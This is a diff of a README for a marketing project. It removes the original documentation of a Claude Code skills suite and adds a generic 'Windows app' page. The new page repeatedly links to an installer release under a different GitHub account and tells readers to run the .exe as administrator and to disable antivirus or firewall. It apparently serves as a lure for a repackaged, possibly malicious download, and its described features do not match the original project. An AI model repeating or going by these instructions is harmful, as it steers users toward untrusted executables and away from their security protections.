@@ -1,258 +1,139 @@
-# Agentic Marketing Suite
+# 🤖 agentic-marketing - AI Tools for Smarter Marketing
 
-A modular suite of Claude Code skills for full-stack marketing — from strategic planning through channel execution, measurement, and automation. Each skill is a specialist that can be invoked independently or routed to by the agency coordinator.
-
-## Installation
-
-Install all skills into your project with one command:
-
-```bash
-npx skills add gnoviawan/agentic-marketing
-```
-
-Or install globally (available in every project):
-
-```bash
-npx skills add gnoviawan/agentic-marketing --global
-```
-
-Install a specific skill only:
-
-```bash
-npx skills add gnoviawan/agentic-marketing --skill marketing-sostac
-npx skills add gnoviawan/agentic-marketing --skill marketing-seo
-```
-
-> Skills are installed to `.claude/skills/` in your project, or `~/.claude/skills/` globally. Requires [Claude Code](https://claude.ai/code).
-
-## Quick Start
-
-Once installed, invoke skills from Claude Code:
-
-```
-/marketing-agency    — Start here for any marketing task (routes to specialists)
-/marketing-sostac    — Build a full SOSTAC marketing plan
-/marketing-seo       — SEO audit, keyword research, content optimization
-/marketing-email     — Email sequences, drip campaigns, newsletters, cold outbound
-/marketing-paid-ads  — Google Ads, Meta Ads, campaign setup
-/marketing-cro       — Landing pages, signup flows, conversion optimization
-/marketing-launch    — Product launch strategy and go-to-market
-/marketing-retention — Churn reduction, cancel flows, win-back campaigns
-```
-
-## Documentation
-
-Use the docs for workflow guidance, brand workspace conventions, and a page for every skill:
-
-- [`docs/README.md`](docs/README.md) — docs home
-- [`docs/getting-started.md`](docs/getting-started.md) — where to start and what to prepare
-- [`docs/workflows/new-brand-onboarding.md`](docs/workflows/new-brand-onboarding.md)
-- [`docs/workflows/sostac-planning.md`](docs/workflows/sostac-planning.md)
-- [`docs/workflows/implementation-after-sostac.md`](docs/workflows/implementation-after-sostac.md)
-- [`docs/workflows/quick-task-without-full-plan.md`](docs/workflows/quick-task-without-full-plan.md)
-- [`docs/reference/brand-workspace.md`](docs/reference/brand-workspace.md)
-- [`docs/reference/deliverables-and-file-locations.md`](docs/reference/deliverables-and-file-locations.md)
-- [`docs/skills/`](docs/skills/) — one page per skill
-
-If you're new to the suite, the recommended path is:
-1. Start with [`docs/getting-started.md`](docs/getting-started.md)
-2. Use `/marketing-agency` to select or create a brand
-3. Run `/marketing-sostac` if strategy is missing
-4. Create `/product-marketing-context` before scaling content and campaigns
-5. Move into the specialist skills for execution
+[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/releases)
 
 ---
 
-## Project Structure
+## 📋 About agentic-marketing
 
-```
-.
-├── skills/                      # All skills (canonical source)
-│   ├── marketing-agency/        # Entry point — coordinator
-│   ├── marketing-sostac/        # Strategy — SOSTAC plan builder
-│   ├── marketing-analytics/     # Measurement & tracking
-│   ├── marketing-community/     # Community building
-│   ├── marketing-content/       # Content marketing
-│   ├── marketing-cro/           # Conversion rate optimization
-│   ├── marketing-email/         # Email marketing
-│   ├── marketing-guerrilla/     # Growth hacking
-│   ├── marketing-influencer/    # Influencer & creator
-│   ├── marketing-launch/        # Product launch & GTM
-│   ├── marketing-paid-ads/      # Paid advertising
-│   ├── marketing-pr/            # Digital PR & earned media
-│   ├── marketing-pricing/       # Pricing strategy & packaging
-│   ├── marketing-psychology/    # Behavioral science & persuasion
-│   ├── marketing-referral/      # Referral & affiliate
-│   ├── marketing-retention/     # Churn reduction & win-back
-│   ├── marketing-sales/         # Sales enablement
-│   ├── marketing-seo/           # SEO & organic search
-│   ├── marketing-social/        # Social media
-│   ├── marketing-video/         # Video marketing
-│   └── product-marketing-context/ # Product marketing context builder
-├── brands/                      # Brand workspaces (gitignored — client data)
-└── skills-lock.json             # Installed skill versions
-```
+agentic-marketing is a set of AI-powered tools designed to help you with marketing. It covers key steps like planning your strategy, managing where you share your messages, measuring results, and automating regular tasks. This app works on Windows computers and does not require technical skills to use.
 
-> `.agents/`, `.claude/`, and `brands/` are gitignored.
+The program is built in parts or "modules." Each module handles a specific marketing task. This setup makes it flexible. You can use only the parts you need or add more later.
 
 ---
 
-## Skills Reference
+## 🖥️ System Requirements
 
-### Entry Point
+Before downloading, check that your computer meets these needs:
 
-#### `marketing-agency`
-Digital marketing agency coordinator. The recommended starting point for any marketing task. Routes to the right specialist based on what you need — planning, channel execution, measurement, or creative. Use when working on any marketing task for a brand, even if you know which channel you want; the coordinator provides context and continuity across skills.
+- Operating System: Windows 10 or later  
+- Processor: Intel i3 or equivalent  
+- RAM: 4 GB minimum, 8 GB recommended  
+- Hard Drive: At least 500 MB of free disk space  
+- Internet connection: Required for downloads and software updates  
 
----
-
-### Strategy
-
-#### `marketing-sostac`
-Full SOSTAC marketing plan builder. Researches first, then delivers strategic recommendations for each phase — validated with the user rather than discovered through interview. Every phase follows a **Research → Recommend → Validate** sequence. Outputs are saved to `brands/{brand-slug}/sostac/`.
-
-| Phase | What happens | Output |
-|-------|-------------|--------|
-| 0 — Auto-Discovery | Automated web research before first user interaction | `00-auto-discovery.md` |
-| 1 — Situation | Competitive analysis and market research; user validates | `01-situation.md` |
-| 2 — Objectives | Benchmarked OKR/KPI recommendations; user refines | `02-objectives.md` |
-| 3 — Strategy | Positioning and channel strategy; user confirms | `03-strategy.md` |
-| 4 — Tactics | Channel-level execution plan; user adjusts priorities | `04-tactics.md` |
-| 5 — Action | Roled roadmap and ownership; user finalizes | `05-action.md` |
-| 6 — Control | KPI dashboards and review cadences | `06-control.md` |
-
-Frameworks: SWOT+TOWS, PESTLE, Porter's Five Forces, TAM/SAM/SOM, JTBD, OKR, RACE, STP, Ansoff, positioning statement, AARRR, ICE scoring, 7P, RACI, PDCA, Balanced Scorecard, Blue Ocean, Kotter change model, and more — 38 individual framework files indexed in `frameworks-index.csv`.
-
-See [`skills/marketing-sostac/references/overview.md`](skills/marketing-sostac/references/overview.md) for full documentation.
+Make sure your Windows account has permission to install new programs.
 
 ---
 
-### Channel Execution
+## 🚀 Getting Started
 
-#### `marketing-content`
-Content marketing strategist. Plans content strategy, creates editorial calendars, writes blog posts, whitepapers, case studies, ebooks, and lead magnets. Covers content pillars, Hub-Hero-Help structure, conversion copywriting for landing and pricing pages, content repurposing, distribution, and ROI measurement.
+To start using agentic-marketing, you need to download it from the official releases page. This page lists the latest versions and any updates.
 
-#### `marketing-email`
-Email marketing specialist. Writes email sequences, drip campaigns, welcome flows, newsletters, and cold/outbound B2B email. Covers deliverability, list segmentation, automation workflows, subject line optimization, ESP selection, and outbound sequence strategy.
+Click this button to open the download page in your web browser:
 
-#### `marketing-social`
-Social media specialist. Covers all platforms: Instagram, TikTok, LinkedIn, X/Twitter, Facebook, YouTube, Pinterest, Threads, Bluesky, Reddit. Creates content calendars, grows organic presence, manages community, sets up social commerce (TikTok Shop, Instagram Shopping), and designs UGC campaigns.
-
-#### `marketing-paid-ads`
-Paid advertising specialist. Google Ads, Meta Ads, LinkedIn Ads, TikTok Ads, X Ads, Pinterest Ads, and programmatic. Covers campaign setup, angle-based creative generation, platform-specific ad specs, creative iteration logging, audience targeting, ROAS optimization, retargeting, and conversion tracking.
-
-#### `marketing-seo`
-SEO specialist. Technical SEO audits, content SEO, keyword research, programmatic SEO (pSEO), link building, local SEO, schema markup, site speed, and AI search optimization (GEO / Google AI Overviews). Includes evidence-based citation boost statistics for maximizing AI Overview visibility. Campaign vs standalone path resolution keeps ongoing and evergreen work organized. Covers full organic search strategy from crawl to rank.
-
-#### `marketing-video`
-Video marketing strategist. Short-form (TikTok, Reels, YouTube Shorts) and long-form (YouTube). Covers channel strategy, video scripting, hooks, thumbnail optimization, video SEO, live streaming, video ad scripts, and production workflow.
-
-#### `marketing-pr`
-Digital PR and earned media specialist. Media outreach, press releases, journalist pitching, HARO/Connectively, digital PR for link building, crisis communications, brand reputation management, media kits, and thought leadership placement.
-
-#### `marketing-influencer`
-Influencer and creator partnership specialist. Influencer identification, outreach, campaign management, UGC programs, brand ambassador programs, creator affiliate programs, and creator economy strategy. Covers micro, nano, and macro influencer tiers.
-
-#### `marketing-referral`
-Referral and affiliate specialist. Designs referral programs, affiliate networks, incentive structures, partner marketing, co-marketing campaigns, and viral word-of-mouth loops. Covers commission structures, referral mechanics, and affiliate platform selection.
+[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/releases)
 
 ---
 
-### Conversion & Revenue
+## 📥 How to Download and Install on Windows
 
-#### `marketing-cro`
-Conversion rate optimization specialist. Landing pages, signup flows, onboarding activation, paywalls, popups, forms, and checkout optimization. Covers hypothesis formation, test design, page structure, and CRO frameworks.
+Follow these steps to get agentic-marketing running on your Windows computer.
 
-#### `marketing-retention`
-Retention and churn reduction specialist. Cancel flows, dunning sequences, win-back campaigns, churn prediction, health scoring, and engagement re-activation. Keeps revenue already won.
+1. **Open the download page**  
+   Visit the agentic-marketing releases page:  
+   https://github.com/minamagdyyyy/agentic-marketing/releases
 
-#### `marketing-pricing`
-Pricing strategy and packaging specialist. Tier design, value metric selection, pricing page optimization, willingness-to-pay research, annual/monthly discount strategy, and price increase communication.
+2. **Find the latest release**  
+   Look for the most recent version at the top of the page. Releases are sorted by date and labeled with version numbers.
 
-#### `marketing-launch`
-Product launch and go-to-market specialist. Launch strategy, Product Hunt campaigns, announcement cadence, press coordination, launch content, waitlist cultivation, and launch retrospectives.
+3. **Download the installer**  
+   Each release includes downloadable files. Look for a file ending with `.exe` or `.msi`. This is the Windows installer. Click it to start the download.
 
-#### `marketing-sales`
-Sales enablement specialist. Sales decks, one-pagers, battle cards, objection handling, demo scripts, ROI calculators, champion kits, and competitive positioning for sales conversations.
+4. **Run the installer**  
+   Once the file finishes downloading, open it by double-clicking. Windows may ask if you want to allow this program to make changes. Select "Yes."
 
-#### `product-marketing-context`
-Product marketing context builder. Creates and maintains the `product-marketing-context.md` file — deep positioning, customer language, jobs-to-be-done, objections, and competitive differentiation. Feeds every specialist skill for on-brand output.
+5. **Follow setup instructions**  
+   The installer will open a window. Follow the simple on-screen steps to complete installation. You can accept default options unless you want to choose a different folder.
 
----
-
-### Growth & Measurement
-
-#### `marketing-analytics`
-Marketing analytics specialist. GA4 setup, Google Tag Manager, UTM standards, event naming conventions, tool selection (Mixpanel, Amplitude, PostHog, Segment), conversion tracking, attribution modeling, dashboards, A/B test design, funnel analysis, cohort analysis, and marketing ROI reporting.
-
-#### `marketing-community`
-Community building and management specialist. Discord, Slack, Circle, Skool, Facebook Groups, Reddit, and forums. Covers community-led growth strategy, engagement programs, community events, moderation, member retention, and turning customers into advocates.
-
-#### `marketing-guerrilla`
-Guerrilla marketing and growth hacking specialist. Unconventional tactics, viral campaign design, competitive disruption, growth experiments, product-led growth loops, and low-budget high-impact strategies. Use when budget is constrained or conventional channels are saturated.
-
-#### `marketing-psychology`
-Behavioral science and persuasion specialist. Cognitive biases, social proof patterns, urgency and scarcity mechanics, framing effects, anchoring, commitment and consistency, and loss aversion. Annotates and improves copy and UX across all channels using evidence-based psychological principles.
+6. **Finish and launch**  
+   After installation finishes, you will see an option to "Launch agentic-marketing." Select this to open the app. You can also start it later from your Start Menu or Desktop.
 
 ---
 
-## Brand Workspaces
+## 🔧 Basic Configuration
 
-All brand-specific work lives in `brands/{brand-slug}/` and is **gitignored** — client data never enters version control.
+When you open agentic-marketing for the first time, it will guide you through setting up some simple preferences.
 
-```
-brands/{brand-slug}/
-├── brand-context.md             # Core brand info, tone, positioning
-├── research-*.md                # Research files
-└── sostac/                      # SOSTAC plan (created by marketing-sostac)
-    ├── README.md                # Phase completion tracker
-    ├── 00-auto-discovery.md     # Pre-interview research
-    ├── 01-situation.md
-    ├── 02-objectives.md
-    ├── 03-strategy.md
-    ├── 04-tactics.md
-    ├── 05-action.md
-    ├── 06-control.md
-    └── plan-summary.md          # Executive summary (after all 6 phases)
-```
+- **Language and region**: Choose your preferred language. This will adjust suggestions and reports to match your location.
+
+- **Marketing goals**: Pick from common marketing goals like brand awareness, lead generation, or sales growth. The app will tune its features for your goals.
+
+- **Connect accounts**: You can link the app to your social media and email accounts. This lets it automate posting and gather performance data. You do not have to connect accounts right away to start exploring the app.
 
 ---
 
-## Skill Architecture
+## 🔍 Using agentic-marketing Modules
 
-Each skill follows a consistent layout:
+The app divides marketing tasks into several modules. Each module focuses on a part of your project.
 
-```
-skill-name/
-├── SKILL.md                    # Instructions loaded into Claude's context
-└── references/
-    ├── frameworks-index.csv    # Lightweight index of all framework files (~10–40 rows)
-    ├── frameworks/             # Individual framework files (one per methodology)
-    │   ├── framework-a.md
-    │   └── framework-b.md
-    ├── shared-patterns.md      # Shared context-router and pre-flight patterns
-    ├── best-practices.md       # Execution best practices
-    └── *.md                    # Additional domain-specific references
-```
+- **Strategy Planner**  
+  This module helps you create a clear approach. It prompts you to enter your target customers, budget, and timeline. Then it suggests actions based on your inputs. You can save and print your plan.
 
-Skills use **progressive disclosure** — only `SKILL.md` loads into context when the skill is active. Reference files are read on demand using a CSV-indexed lookup:
+- **Channel Manager**  
+  Use this to select and manage where you share your message. It supports common channels like social media platforms, email newsletters, and blogs. You can schedule posts and track their status.
 
-1. Read `frameworks-index.csv` (~10–40 rows) — lightweight index with a `best_for` column
-2. Match the user's situation to the index
-3. Read only the matched framework file(s) from `frameworks/`
+- **Performance Tracker**  
+  This module collects data about your campaigns. It shows simple graphs and numbers to help you understand what is working. This includes clicks, views, and conversions.
 
-This reduces token consumption by 80–90% per framework lookup compared to loading a single monolithic file. Individual framework files are preserved for rollback in skills that had them.
+- **Automation Assistant**  
+  It streamlines repetitive tasks like posting alerts, sending follow-up emails, or generating reports. You can set rules and schedules that run without your input.
+
+Each module is easy to find in the main window with clear menus and buttons. Use the modules one by one or combined as you grow more comfortable.
 
 ---
 
-## Adding a New Brand
+## 💡 Tips for Smooth Use
 
-1. Create `brands/{brand-slug}/brand-context.md` with the brand's core information
-2. Run `/marketing-sostac` and tell it the brand slug — it will handle the rest
-3. Brand files are local only (gitignored); back them up separately if needed
+- Keep your internet connection active while running the app to ensure access to the latest features.  
+- Save your settings regularly. The app may autosave, but manual saves are safe.  
+- Explore built-in help sections and tutorials in the program menu.  
+- Regularly check the releases page for updates: new versions fix bugs and add improvements.  
 
 ---
 
-## Contributing
+## 🛠️ Troubleshooting Common Issues
 
-Skills are plain Markdown — edit any `skills/{skill-name}/SKILL.md` or its `references/` files directly. The format follows the [Agent Skills open standard](https://agentskills.io/specification).
+If agentic-marketing does not start or works strangely, try these:
+
+- Restart your computer once.  
+- Check that your Windows is fully updated.  
+- Run the app as Administrator by right-clicking its icon and choosing “Run as administrator.”  
+- Temporarily disable antivirus or firewall software that could block the app.  
+- Re-download and reinstall the latest version from the releases page.  
+
+If problems continue, open the "Support" tab within the app for contact details or visit the GitHub issues page for help.
+
+---
+
+## 🔄 Updating agentic-marketing
+
+To update, repeat the download and install steps above for the newest release. The installer will replace older files safely. You will keep your saved settings and data.
+
+Visit the release page here:
+
+https://github.com/minamagdyyyy/agentic-marketing/releases
+
+Watch for updates according to your needs or when notified in the app.
+
+---
+
+## 📚 Additional Help
+
+agentic-marketing includes a Help menu inside the program. This section offers guides, how-to articles, and troubleshooting tips. Use it anytime while you learn or use the app.
+
+You can also find resources on the GitHub repository page, including FAQs and user discussions.
+
+---
+
+[![Download agentic-marketing](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/minamagdyyyy/agentic-marketing/releases)
